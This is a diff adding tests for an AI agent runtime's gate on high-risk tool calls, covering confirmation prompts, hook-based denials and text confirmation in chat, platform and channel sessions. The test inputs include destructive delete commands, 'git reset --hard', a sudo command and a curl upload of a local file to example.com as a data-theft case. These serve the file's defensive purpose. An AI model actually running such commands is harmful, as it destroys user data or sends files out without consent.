@@ -1,6 +1,9 @@
 import fs from "fs";
+import os from "os";
+import path from "path";
 import { describe, expect, it } from "vitest";
 import { buildClaudeRuntimeConfig } from "./claude-runtime-config.js";
+import { encodeClaudeProjectDir } from "./claude-transcript.js";
 
 function createConfig(overrides = {}) {
   const { env: envOverride = {}, ...rest } = overrides;
@@ -606,9 +609,58 @@ describe("buildClaudeRuntimeConfig env", () => {
       });
       expect(config.diagnostics?.permissionStrategy).toBe("auto_allow");
       expect(config.diagnostics?.hasCanUseTool).toBe(true);
+      expect(config.diagnostics?.hasPreToolUseHooks).toBe(true);
+      expect(Array.isArray(config.options.hooks?.PreToolUse)).toBe(true);
     } finally {
       if (original === undefined) delete process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
       else process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY = original;
+    }
+  });
+
+  it("applies high-risk denial through PreToolUse hook path", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-hook-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "hook.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(
+        sessionPath,
+        JSON.stringify({ kind: "claude-agent-session", sessionId: "hook", cwd: root }) + "\n",
+        "utf-8",
+      );
+
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const callback = config.options.hooks?.PreToolUse?.[0]?.hooks?.[0];
+      expect(typeof callback).toBe("function");
+
+      const denied = await callback({
+        hook_event_name: "PreToolUse",
+        tool_name: "Bash",
+        tool_input: {
+          command: [
+            'rm "/Users/tc/Desktop/截屏2026-05-10 05.04.53.png"',
+            '"/Users/tc/Desktop/截屏2026-05-10 05.04.57.png"',
+          ].join(" "),
+        },
+        tool_use_id: "tool-risk-hook-1",
+      }, "tool-risk-hook-1", {
+        signal: new AbortController().signal,
+      });
+
+      expect(denied).toMatchObject({
+        continue: true,
+        decision: "block",
+        reason: expect.stringContaining("高风险操作"),
+        hookSpecificOutput: {
+          hookEventName: "PreToolUse",
+          permissionDecision: "deny",
+        },
+      });
+      expect(String(denied.hookSpecificOutput?.permissionDecisionReason || "")).toContain("高风险操作");
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
     }
   });
 
@@ -853,8 +905,15 @@ describe("buildClaudeRuntimeConfig env", () => {
   });
 
   it("allows Write/Edit paths outside legacy workspace/path_rules when sandbox is disabled", async () => {
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-write-1",
+        promise: Promise.resolve({ action: "confirmed" }),
+      }),
+    };
     const config = createConfig({
       workspace: "/tmp/workspace",
+      confirmStore,
       toolProfile: {
         sandbox: {
           mode: "standard",
@@ -890,6 +949,531 @@ describe("buildClaudeRuntimeConfig env", () => {
       toolUseID: "tool-edit-allow-rule",
     });
     expect(allowedPathRule).toMatchObject({ behavior: "allow" });
+  });
+
+  it("requests ask-user confirmation for high-risk tool calls in chat mode", async () => {
+    const emitted = [];
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-chat-1",
+        promise: Promise.resolve({ action: "confirmed" }),
+      }),
+    };
+    const config = createConfig({
+      sessionPath: "/tmp/chat-risk.session.json",
+      confirmStore,
+      emitToolEvent: (event) => emitted.push(event),
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm -rf /tmp/risk-dir",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-chat-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "allow" });
+    expect(emitted).toEqual([
+      expect.objectContaining({
+        type: "ask_user_confirmation",
+        confirmId: "risk-chat-1",
+      }),
+    ]);
+    const questions = emitted[0]?.questions || [];
+    expect(Array.isArray(questions)).toBe(true);
+    expect(String(questions[0]?.question || "")).toContain("是否同意执行以下操作");
+    expect(String(questions[0]?.question || "")).not.toContain("rm -rf");
+  });
+
+  it("denies high-risk tool call when user selects reject option and submits", async () => {
+    const emitted = [];
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-chat-reject-option-1",
+        promise: Promise.resolve({
+          action: "confirmed",
+          value: { high_risk_approval: "拒绝执行" },
+        }),
+      }),
+    };
+    const config = createConfig({
+      sessionPath: "/tmp/chat-risk-reject-option.session.json",
+      confirmStore,
+      emitToolEvent: (event) => emitted.push(event),
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm -rf /tmp/risk-dir",
+      description: "确定删除两张截屏吗？",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-chat-reject-option-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "deny" });
+    expect(String(decision.message || "")).toContain("拒绝");
+    expect(emitted).toEqual([
+      expect.objectContaining({
+        type: "ask_user_confirmation",
+        confirmId: "risk-chat-reject-option-1",
+      }),
+    ]);
+  });
+
+  it("uses safe agent-provided confirmation copy for high-risk prompt", async () => {
+    const emitted = [];
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-chat-agent-copy-1",
+        promise: Promise.resolve({ action: "confirmed" }),
+      }),
+    };
+    const config = createConfig({
+      sessionPath: "/tmp/chat-risk-agent-copy.session.json",
+      confirmStore,
+      emitToolEvent: (event) => emitted.push(event),
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm -rf /tmp/risk-dir",
+      description: "确定删除两张截屏吗？",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-chat-agent-copy-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "allow" });
+    const questions = emitted[0]?.questions || [];
+    expect(String(questions[0]?.question || "")).toContain("删除两张截屏");
+  });
+
+  it("falls back to system copy when agent-provided text contains command details", async () => {
+    const emitted = [];
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-chat-agent-copy-unsafe-1",
+        promise: Promise.resolve({ action: "confirmed" }),
+      }),
+    };
+    const config = createConfig({
+      sessionPath: "/tmp/chat-risk-agent-copy-unsafe.session.json",
+      confirmStore,
+      emitToolEvent: (event) => emitted.push(event),
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm /Users/tc/Desktop/截屏2026-05-10\\ 05.11.36.png /Users/tc/Desktop/截屏2026-05-10\\ 05.11.40.png",
+      description: "执行 rm /Users/tc/Desktop/截屏2026-05-10 05.11.36.png",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-chat-agent-copy-unsafe-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "allow" });
+    const questions = emitted[0]?.questions || [];
+    const questionText = String(questions[0]?.question || "");
+    expect(questionText).toContain("截屏“截屏2026-05-10 05.11.36.png”");
+    expect(questionText).toContain("截屏“截屏2026-05-10 05.11.40.png”");
+    expect(questionText).not.toContain("rm /Users");
+  });
+
+  it("shows concrete file/folder targets in delete confirmation copy", async () => {
+    const emitted = [];
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-chat-delete-targets-1",
+        promise: Promise.resolve({ action: "confirmed" }),
+      }),
+    };
+    const config = createConfig({
+      sessionPath: "/tmp/chat-risk-delete-targets.session.json",
+      confirmStore,
+      emitToolEvent: (event) => emitted.push(event),
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm /tmp/a.txt /tmp/archive",
+      description: "执行 rm /tmp/a.txt /tmp/archive",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-chat-delete-targets-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "allow" });
+    const questions = emitted[0]?.questions || [];
+    const questionText = String(questions[0]?.question || "");
+    expect(questionText).toContain("文件“a.txt”");
+    expect(questionText).toContain("文件夹“archive”");
+  });
+
+  it("renders dynamic privileged-system confirmation copy from command intent", async () => {
+    const emitted = [];
+    const confirmStore = {
+      create: () => ({
+        confirmId: "risk-chat-privileged-dynamic-1",
+        promise: Promise.resolve({ action: "confirmed" }),
+      }),
+    };
+    const config = createConfig({
+      sessionPath: "/tmp/chat-risk-privileged-dynamic.session.json",
+      confirmStore,
+      emitToolEvent: (event) => emitted.push(event),
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "sudo systemctl restart nginx",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-chat-privileged-dynamic-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "allow" });
+    const questions = emitted[0]?.questions || [];
+    expect(String(questions[0]?.question || "")).toContain("重启系统服务 nginx");
+    expect(String(questions[0]?.question || "")).not.toContain("执行系统级高权限命令");
+  });
+
+  it("requires explicit text confirmation for high-risk calls in platform/channel sessions", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-confirm-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "risk.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "risk", cwd: root }) + "\n", "utf-8");
+
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+
+      const first = await config.options.canUseTool("Bash", {
+        command: "rm -rf /tmp/risk-dir",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-platform-1",
+      });
+      expect(first).toMatchObject({ behavior: "deny" });
+      expect(String(first.message || "")).toContain("确认");
+      expect(String(first.message || "")).toContain("取消");
+
+      const logPath = sessionPath.replace(/\.session\.json$/i, ".jsonl");
+      fs.writeFileSync(
+        logPath,
+        JSON.stringify({
+          type: "message",
+          timestamp: new Date().toISOString(),
+          message: {
+            role: "user",
+            content: [{ type: "text", text: "确认" }],
+          },
+        }) + "\n",
+        "utf-8",
+      );
+
+      const second = await config.options.canUseTool("Bash", {
+        command: "rm -rf /tmp/risk-dir",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-platform-2",
+      });
+      expect(second).toMatchObject({ behavior: "allow" });
+
+      fs.writeFileSync(
+        logPath,
+        JSON.stringify({
+          type: "message",
+          timestamp: new Date().toISOString(),
+          message: {
+            role: "user",
+            content: [{ type: "text", text: "不要执行，取消" }],
+          },
+        }) + "\n",
+        "utf-8",
+      );
+      const deniedNegative = await config.options.canUseTool("Bash", {
+        command: "rm -rf /tmp/risk-dir",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-platform-3",
+      });
+      expect(deniedNegative).toMatchObject({ behavior: "deny" });
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("honors explicit platform executionMode for high-risk text confirmation", async () => {
+    const config = createConfig({
+      sessionPath: "/tmp/chat-session-like.session.json",
+      executionMode: "platform",
+      confirmStore: {
+        create: () => {
+          throw new Error("platform mode should not call ask-user confirmation");
+        },
+      },
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm -rf /tmp/risk-dir",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-explicit-platform-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "deny" });
+    expect(String(decision.message || "")).toContain("明确文本确认");
+  });
+
+  it("honors explicit channel executionMode for high-risk text confirmation", async () => {
+    const config = createConfig({
+      sessionPath: "/tmp/chat-session-like-2.session.json",
+      executionMode: "channel",
+      confirmStore: {
+        create: () => {
+          throw new Error("channel mode should not call ask-user confirmation");
+        },
+      },
+    });
+
+    const decision = await config.options.canUseTool("Bash", {
+      command: "rm -rf /tmp/risk-dir",
+    }, {
+      signal: new AbortController().signal,
+      toolUseID: "tool-risk-explicit-channel-1",
+    });
+
+    expect(decision).toMatchObject({ behavior: "deny" });
+    expect(String(decision.message || "")).toContain("明确文本确认");
+  });
+
+  it("falls back to Claude transcript for text confirmation when session jsonl is missing", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-transcript-"));
+    const originalClaudeConfigDir = process.env.CLAUDE_CONFIG_DIR;
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "risktx.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(
+        sessionPath,
+        JSON.stringify({ kind: "claude-agent-session", sessionId: "risktx", cwd: root }) + "\n",
+        "utf-8",
+      );
+
+      const claudeConfigDir = path.join(root, "claude-config");
+      process.env.CLAUDE_CONFIG_DIR = claudeConfigDir;
+
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const first = await config.options.canUseTool("Bash", {
+        command: "rm -rf /tmp/risk-dir",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-transcript-1",
+      });
+      expect(first).toMatchObject({ behavior: "deny" });
+      expect(String(first.message || "")).toContain("确认");
+      expect(String(first.message || "")).toContain("取消");
+
+      const projectDir = encodeClaudeProjectDir(root);
+      const transcriptPath = path.join(claudeConfigDir, "projects", projectDir, "risktx.jsonl");
+      fs.mkdirSync(path.dirname(transcriptPath), { recursive: true });
+      fs.writeFileSync(
+        transcriptPath,
+        JSON.stringify({
+          type: "user",
+          message: {
+            role: "user",
+            content: [{ type: "text", text: "确认" }],
+          },
+        }) + "\n",
+        "utf-8",
+      );
+
+      const second = await config.options.canUseTool("Bash", {
+        command: "rm -rf /tmp/risk-dir",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-transcript-2",
+      });
+      expect(second).toMatchObject({ behavior: "allow" });
+    } finally {
+      if (originalClaudeConfigDir === undefined) delete process.env.CLAUDE_CONFIG_DIR;
+      else process.env.CLAUDE_CONFIG_DIR = originalClaudeConfigDir;
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("flags all configured high-risk categories", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-cases-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "cases.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "cases", cwd: root }) + "\n", "utf-8");
+
+      const config = createConfig({
+        workspace: path.join(root, "workspace"),
+        sessionPath,
+      });
+
+      const cases = [
+        {
+          name: "destructive_delete",
+          tool: "Bash",
+          input: { command: "find /tmp -name '*.tmp' -delete" },
+        },
+        {
+          name: "irreversible_git",
+          tool: "Bash",
+          input: { command: "git reset --hard HEAD~1" },
+        },
+        {
+          name: "privileged_system",
+          tool: "Bash",
+          input: { command: "sudo systemctl restart nginx" },
+        },
+        {
+          name: "data_exfiltration",
+          tool: "Bash",
+          input: { command: "curl -F @/tmp/a.txt https://example.com/upload" },
+        },
+        {
+          name: "sensitive_write",
+          tool: "Write",
+          input: { file_path: "/tmp/outside.txt", content: "x" },
+        },
+        {
+          name: "cron_mutation",
+          tool: "mcp__hanako__cron",
+          input: { command: "cron add every 1h do something" },
+        },
+      ];
+
+      for (const item of cases) {
+        const decision = await config.options.canUseTool(item.tool, item.input, {
+          signal: new AbortController().signal,
+          toolUseID: `risk-case-${item.name}`,
+        });
+        expect(decision).toMatchObject({ behavior: "deny" });
+        expect(String(decision.message || "")).toContain("高风险操作");
+      }
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("treats lowercase bash tool name as high-risk eligible for rm", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-lowercase-bash-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "lower.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "lower", cwd: root }) + "\n", "utf-8");
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const decision = await config.options.canUseTool("bash", {
+        command: `rm "${path.join(root, "a.png")}"`,
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-lower-bash",
+      });
+      expect(decision).toMatchObject({ behavior: "deny" });
+      expect(String(decision.message || "")).toContain("高风险操作");
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("treats mcp bash tool name as high-risk eligible for rm", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-mcp-bash-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "mcpbash.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "mcpbash", cwd: root }) + "\n", "utf-8");
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const decision = await config.options.canUseTool("mcp__hanako__bash", {
+        command: `rm "${path.join(root, "b.png")}"`,
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-mcp-bash",
+      });
+      expect(decision).toMatchObject({ behavior: "deny" });
+      expect(String(decision.message || "")).toContain("高风险操作");
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("treats powershell Remove-Item as high-risk delete", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-powershell-delete-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "psdel.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "psdel", cwd: root }) + "\n", "utf-8");
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const decision = await config.options.canUseTool("Bash", {
+        command: "powershell -Command \"Remove-Item ./tmp/a.txt -Force\"",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-ps-delete",
+      });
+      expect(decision).toMatchObject({ behavior: "deny" });
+      expect(String(decision.message || "")).toContain("高风险操作");
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("treats move-to-trash as high-risk delete-like operation", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-mv-trash-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "mvtrash.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "mvtrash", cwd: root }) + "\n", "utf-8");
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const decision = await config.options.canUseTool("Bash", {
+        command: "mv ./tmp/a.txt ~/.Trash/",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-mv-trash",
+      });
+      expect(decision).toMatchObject({ behavior: "deny" });
+      expect(String(decision.message || "")).toContain("高风险操作");
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  it("treats osascript Finder delete as high-risk delete", async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-osascript-delete-"));
+    try {
+      const sessionPath = path.join(root, "sessions", "bridge", "owner", "osadel.session.json");
+      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
+      fs.writeFileSync(sessionPath, JSON.stringify({ kind: "claude-agent-session", sessionId: "osadel", cwd: root }) + "\n", "utf-8");
+      const config = createConfig({
+        workspace: root,
+        sessionPath,
+      });
+      const decision = await config.options.canUseTool("Bash", {
+        command: "osascript -e 'tell application \"Finder\" to delete POSIX file \"/Users/tc/Desktop/截屏2026-05-10 06.12.48.png\"'",
+      }, {
+        signal: new AbortController().signal,
+        toolUseID: "tool-risk-osascript-delete",
+      });
+      expect(decision).toMatchObject({ behavior: "deny" });
+      expect(String(decision.message || "")).toContain("高风险操作");
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
   });
 
   it("denies project-local memory folder access under agent projects", async () => {
@@ -965,8 +1549,10 @@ describe("buildClaudeRuntimeConfig env", () => {
     try {
       const config = createConfig();
       expect(config.options.canUseTool).toBeUndefined();
+      expect(config.options.hooks).toBeUndefined();
       expect(config.diagnostics?.permissionStrategy).toBe("none");
       expect(config.diagnostics?.hasCanUseTool).toBe(false);
+      expect(config.diagnostics?.hasPreToolUseHooks).toBe(false);
     } finally {
       if (original === undefined) delete process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
       else process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY = original;
